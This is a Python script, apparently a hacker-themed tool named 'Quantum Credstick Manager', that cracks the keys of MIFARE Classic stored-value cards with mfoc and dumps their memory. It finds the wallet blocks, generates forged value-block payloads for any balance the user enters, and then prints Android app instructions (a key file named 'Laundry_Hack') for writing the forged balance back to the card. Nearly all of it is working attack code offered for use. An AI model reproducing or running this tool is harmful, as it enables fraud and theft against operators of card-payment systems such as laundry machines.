#!/usr/bin/env python3
import subprocess
import sys
import os
import struct
import binascii
import shutil
import time
import re
from datetime import datetime

# --- THEME: FSOCIETY / CYBERPUNK ---
class Style:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

# --- UI HELPERS ---
def clean_len(text):
    ansi_escape = re.compile(r'\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])')
    return len(ansi_escape.sub('', text))

def smart_pad(text, width, align='center'):
    visible_len = clean_len(text)
    if visible_len >= width: return text 
    padding = width - visible_len
    if align == 'center':
        left = padding // 2
        right = padding - left
        return (" " * left) + text + (" " * right)
    elif align == 'left':
        return text + (" " * padding)
    elif align == 'right':
        return (" " * padding) + text

def smart_center(text, width):
    return smart_pad(text, width, 'center')

def center_ascii_block(text, width):
    """Centers multi-line ASCII art properly"""
    lines = text.strip('\n').split('\n')
    centered_lines = []
    for line in lines:
        vis_len = clean_len(line)
        padding = max(0, (width - vis_len) // 2)
        centered_lines.append(" " * padding + line)
    return "\n".join(centered_lines)

def print_row(id_col, sec_col, type_col, content_col, status_col, key_col):
    row = (
        f" {smart_pad(id_col, 4)} |"
        f" {smart_pad(sec_col, 5)} |"
        f" {smart_pad(type_col, 12)} |"
        f" {smart_pad(content_col, 42, 'left')} |"
        f" {smart_pad(status_col, 11)} |"
        f" {smart_pad(key_col, 14)}"
    )
    print(row)

def banner():
    os.system('clear')
    # Unified width for perfect alignment
    WIDTH = 90 
    
    ascii_art = r"""
  _____ ____ ___ ___ _   _ 
 |  ___/ ___/ _ \_ _| \ | |
 | |_ | |  | | | | ||  \| |
 |  _|| |__| |_| | || |\  |
 |_|   \____\___/___|_| \_|
"""
    # 1. Print ASCII
    print(Style.FAIL + Style.BOLD + center_ascii_block(ascii_art, WIDTH) + Style.ENDC)
    
    # 2. The Requested New Line
    print() 
    
    # 3. Headers (All using the same WIDTH constant)
    print(smart_center(f"{Style.BOLD}[ QUANTUM CREDSTICK MANAGER ]{Style.ENDC}", WIDTH))
    print(smart_center(f"{Style.CYAN}Dev: Nour833{Style.ENDC}", WIDTH))
    print(smart_center(f"{Style.BLUE}\"Control is an illusion.\"{Style.ENDC}", WIDTH))
    print() # Spacer

# --- SYSTEM INTEGRITY ---
def check_dependencies():
    if shutil.which("mfoc") is None:
        print(f"{Style.WARNING}[!] MISSING PROTOCOL: 'mfoc'{Style.ENDC}")
        choice = input(f"    {Style.BOLD}Initialize Auto-Install? (y/n): {Style.ENDC}").lower()
        if choice == 'y':
            try:
                subprocess.run(["sudo", "apt", "update"], check=False)
                subprocess.run(["sudo", "apt", "install", "-y", "mfoc"], check=True)
                banner()
            except: sys.exit(1)
        else: sys.exit(1)

# --- KEY MANAGEMENT ---
KEY_FILE = "fcoin.keys"

def load_keys():
    keys = []
    if os.path.exists(KEY_FILE):
        with open(KEY_FILE, "r") as f:
            keys = [line.strip() for line in f if len(line.strip()) == 12]
    keys.append("FFFFFFFFFFFF")
    keys.append("A0A1A2A3A4A5")
    return list(set(keys))

def save_new_keys(data):
    existing_keys = load_keys()
    new_keys = []
    for s in range(16):
        trailer_off = ((s * 4) + 3) * 16
        k_a = binascii.hexlify(data[trailer_off:trailer_off+6]).decode().upper()
        k_b = binascii.hexlify(data[trailer_off+10:trailer_off+16]).decode().upper()
        if k_a not in existing_keys and k_a not in new_keys: new_keys.append(k_a)
        if k_b not in existing_keys and k_b not in new_keys: new_keys.append(k_b)
    
    if new_keys:
        with open(KEY_FILE, "a") as f:
            for k in new_keys: f.write(k + "\n")
        return len(new_keys)
    return 0

# --- INTELLIGENT DETECTION ENGINE ---
class BlockType:
    WALLET_STD = "WALLET"      
    WALLET_RAW = "COUNTER"     
    TEXT       = "TEXT"        
    TIME       = "TIME"        
    BINARY     = "BINARY"      
    EMPTY      = "EMPTY"
    MFG        = "MFG"

def heuristic_classify(block_data, sector, block_index):
    if len(block_data) != 16: return (BlockType.BINARY, "Invalid Data", None)
    if not any(block_data): return (BlockType.EMPTY, "", None)

    # SPECIAL CASE: SECTOR 0 BLOCK 0
    if sector == 0 and block_index == 0:
        uid = binascii.hexlify(block_data[:4]).decode().upper()
        return (BlockType.MFG, f"UID: {uid}", None)

    # 1. MIFARE WALLET
    try:
        val = struct.unpack('<i', block_data[0:4])[0]
        inv_val = struct.unpack('<i', block_data[4:8])[0]
        val_bkp = struct.unpack('<i', block_data[8:12])[0]
        addr = block_data[12]
        inv_addr = block_data[13]
        if (val == val_bkp) and (val == ~inv_val) and (addr == ~inv_addr & 0xFF):
            return (BlockType.WALLET_STD, f"Bal: {Style.BOLD}{val/100.0:.2f} EUR{Style.ENDC}", val/100.0)
    except: pass

    # 2. ASCII TEXT (Priority over Time)
    printable = sum(1 for c in block_data if 32 <= c <= 126)
    if printable >= 6: 
        txt = "".join([chr(c) if 32 <= c <= 126 else '.' for c in block_data])
        clean = txt.replace('.', '')
        # Detect Vendors 
        if len(clean) > 3:
            if any(char.isdigit() for char in clean) and any(char.isalpha() for char in clean):
                 return (BlockType.TEXT, f"Vendor: {Style.WARNING}{clean[:16]}{Style.ENDC}", 0)
            return (BlockType.TEXT, f"Txt: {clean[:20]}", 0)

    # 3. TIMESTAMP
    try:
        ts = struct.unpack('>I', block_data[0:4])[0]
        if 1262304000 < ts < 2051222400: # 2010-2035
            dt = datetime.fromtimestamp(ts).strftime('%Y-%m-%d')
            return (BlockType.TIME, f"Date: {dt}", 0)
        ts_le = struct.unpack('<I', block_data[0:4])[0]
        if 1262304000 < ts_le < 2051222400:
            dt = datetime.fromtimestamp(ts_le).strftime('%Y-%m-%d')
            return (BlockType.TIME, f"Date: {dt} (LE)", 0)
    except: pass

    # 4. RAW COUNTER
    try:
        val_le = struct.unpack('<I', block_data[0:4])[0]
        rest = binascii.hexlify(block_data[4:]).decode()
        if val_le < 1000000 and rest.startswith("000000"):
             return (BlockType.WALLET_RAW, f"Cnt: {val_le}", val_le)
    except: pass
    
    hex_s = binascii.hexlify(block_data[:5]).decode().upper()
    return (BlockType.BINARY, f"Hex: {hex_s}...", None)

def generate_smart_payload(amount_float, block_addr, w_type):
    pennies = int(amount_float * 100)
    if w_type == BlockType.WALLET_RAW:
        b_val = struct.pack('<I', pennies)
        return binascii.hexlify(b_val + (b'\x00'*12)).decode().upper()
        
    b_val = struct.pack('<i', pennies)
    b_inv = struct.pack('<i', ~pennies)
    b_addr = struct.pack('B', block_addr)
    b_addr_inv = struct.pack('B', ~block_addr & 0xFF)
    raw = b_val + b_inv + b_val + b_addr + b_addr_inv + b_addr + b_addr_inv
    return binascii.hexlify(raw).decode().upper()

# --- MAIN LOGIC ---
def main():
    banner()
    check_dependencies()

    print(f" {Style.GREEN}[*]{Style.ENDC} SYSTEM READY.")
    try:
        input(f"     Place card on reader and press {Style.BOLD}ENTER{Style.ENDC}...")
    except KeyboardInterrupt: sys.exit()

    # 1. CRACKING
    dump_file = "/tmp/fcoin_dump.mfd"
    cached_keys = load_keys()
    print(f"\n {Style.BLUE}[*]{Style.ENDC} INITIATING PROBE...")
    
    cmd = ["mfoc", "-P", "500", "-O", dump_file]
    for k in cached_keys: cmd.extend(["-k", k])

    process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)

    card_type = "Unknown Tag"
    while True:
        line = process.stdout.readline()
        if not line and process.poll() is not None: break
        if line:
            clean = line.strip()
            if "Found" in clean and "tag" in clean: card_type = clean.replace("Found ", "")
            if "Sector" in clean: print(f"     > {clean}")

    if process.returncode != 0:
        print(f"\n {Style.FAIL}[X]{Style.ENDC} READ ERROR.")
        sys.exit(1)

    with open(dump_file, "rb") as f: data = f.read()
    save_new_keys(data)
    uid = binascii.hexlify(data[0:4]).decode().upper()

    print(f"\n {Style.GREEN}[+]{Style.ENDC} ACCESS GRANTED.")
    print(f"     Type: {Style.BOLD}{card_type}{Style.ENDC}")
    print(f"     UID:  {Style.BOLD}{uid}{Style.ENDC}")

    # 2. ANALYSIS TABLE
    print(f"\n{smart_center(Style.BOLD + '--- [ MEMORY FORENSICS ] ---' + Style.ENDC, 100)}")
    print("-" * 100)
    print_row("ID", "SEC", "TYPE", "CONTENT PREVIEW", "STATUS", "KEY A")
    print("-" * 100)

    valid_targets = []
    
    for s in range(16):
        trailer_off = ((s * 4) + 3) * 16
        k_a = binascii.hexlify(data[trailer_off:trailer_off+6]).decode().upper()
        k_b = binascii.hexlify(data[trailer_off+10:trailer_off+16]).decode().upper()
        
        sector_types = []
        sector_infos = []
        is_locked = (k_a != "FFFFFFFFFFFF")
        
        for b in range(3):
            blk_off = ((s * 4) + b) * 16
            blk_data = data[blk_off : blk_off+16]
            t, i, v = heuristic_classify(blk_data, s, b)

            if t != BlockType.EMPTY and t != BlockType.MFG:
                sector_types.append(t)
                if i and i not in sector_infos: sector_infos.append(i)
            
            if t in [BlockType.WALLET_STD, BlockType.WALLET_RAW]:
                if not any(x['sec'] == s for x in valid_targets):
                    # Check backup
                    has_bkp = False
                    b0 = data[((s*4)+0)*16 : ((s*4)+1)*16]
                    b1 = data[((s*4)+1)*16 : ((s*4)+2)*16]
                    if b0 == b1 and t != BlockType.EMPTY: has_bkp = True

                    valid_targets.append({'id': len(valid_targets), 'sec': s, 'type': 'WALLET', 'val': v, 'key': k_b, 'backup': has_bkp})

        # Display Logic
        if not sector_types:
            if s == 0: display_type = f"{Style.BLUE}MFG{Style.ENDC}"; display_info = f"UID: {uid}"
            else: display_type = "EMPTY"; display_info = ""
        else:
            is_vendor = any("Vendor" in x for x in sector_infos)
            
            if BlockType.WALLET_STD in sector_types: display_type = f"{Style.GREEN}WALLET{Style.ENDC}"
            elif is_vendor: display_type = f"{Style.WARNING}VENDOR{Style.ENDC}"
            elif BlockType.TEXT in sector_types: display_type = f"{Style.WARNING}TEXT{Style.ENDC}"
            elif BlockType.TIME in sector_types: display_type = f"{Style.CYAN}TIME{Style.ENDC}"
            else: display_type = "DATA"
            
            display_info = " | ".join(sector_infos)

        status = f"{Style.FAIL}LOCKED{Style.ENDC}" if is_locked else f"{Style.CYAN}FACTORY{Style.ENDC}"
        if "WALLET" in display_type: status = f"{Style.GREEN}{Style.BOLD}ACTIVE{Style.ENDC}"

        t_id = ""
        for vt in valid_targets:
            if vt['sec'] == s: t_id = f"[{vt['id']}]"

        print_row(t_id, str(s), display_type, display_info[:40], status, k_a)

    print("-" * 100)

    # 3. INTERACTION
    if not valid_targets:
        print(f"\n {Style.FAIL}[!] NO EXPLOITABLE WALLETS FOUND.{Style.ENDC}")
        if os.path.exists(dump_file): os.remove(dump_file)
        sys.exit(0)

    try:
        print(f" {Style.BOLD}Enter the [ID] number to target (or 'q' to quit):{Style.ENDC}")
        sel = input(f" > ")
        if sel.lower() == 'q': sys.exit(0)
        target = valid_targets[int(sel)]
    except: 
        print("Invalid Selection.")
        sys.exit(0)

    print(f"\n {Style.BOLD}>>> TARGETING SECTOR {target['sec']} <<<{Style.ENDC}")

    if target['type'] == 'WALLET':
        print(f" Current Value: {Style.GREEN}{target['val']:.2f}{Style.ENDC}")
        try:
            nb = float(input(f" Enter {Style.CYAN}NEW VALUE{Style.ENDC}: "))
        except: sys.exit(1)

        print(f"\n{smart_center(Style.WARNING + Style.BOLD + '>>> ANDROID MISSION BRIEFING <<<' + Style.ENDC, 100)}")
        print(smart_center(f"{Style.BOLD}APP REQUIRED:{Style.ENDC} Mifare Classic Tool (MCT)", 100))
        print(smart_center(f"{Style.BOLD}ACCESS KEY:{Style.ENDC}   {target['key']} (Key B)", 100))
        
        print("\n" + smart_center(f"{Style.UNDERLINE}PHASE 1: KEY SETUP{Style.ENDC}", 100))
        print(" 1. Open MCT -> 'Edit/Add Key File'")
        print(f" 2. Create new file named '{Style.CYAN}Laundry_Hack{Style.ENDC}'")
        print(f" 3. Paste this key: {Style.GREEN}{target['key']}{Style.ENDC}")
        print(" 4. Save.")

        print("\n" + smart_center(f"{Style.UNDERLINE}PHASE 2: CLONE & EDIT{Style.ENDC}", 100))
        print(" 1. Go to 'Read Tag' -> Select eg. 'Laundry_Hack' -> Scan Card.")
        print(" 2. Tap the 'Three Dots' icon (Save Dump) -> Name it eg. 'Modded'.")
        print(" 3. Go to 'Dump Editor' -> Open 'Modded'.")
        print(f" 4. Scroll to {Style.BOLD}Sector {target['sec']}{Style.ENDC} and replace the following blocks:")
        
        # Calculate payloads for display
        s = target['sec']
        for b in range(3):
            blk_off = ((s * 4) + b) * 16
            blk_data = data[blk_off : blk_off+16]
            abs_block = (s * 4) + b
            t, i, v = heuristic_classify(blk_data, s, b)
            
            if t in [BlockType.WALLET_STD, BlockType.WALLET_RAW]:
                payload = generate_smart_payload(nb, abs_block, t)
                print(f"    > Block {Style.BOLD}{abs_block}{Style.ENDC}: {Style.GREEN}{payload}{Style.ENDC}")

        print(" 5. Save the modified dump file.")

        print("\n" + smart_center(f"{Style.UNDERLINE}PHASE 3: WRITE{Style.ENDC}", 100))
        print(" 1. Back in 'Write Dump' screen, tap 'Write Dump'.")
        print(" 2. Hold phone to card until success.")

    if os.path.exists(dump_file): os.remove(dump_file)
    print(f"\n {Style.CYAN}[*] SESSION TERMINATED.{Style.ENDC}")
    input("     Remove card...")

if __name__ == "__main__":
    main()
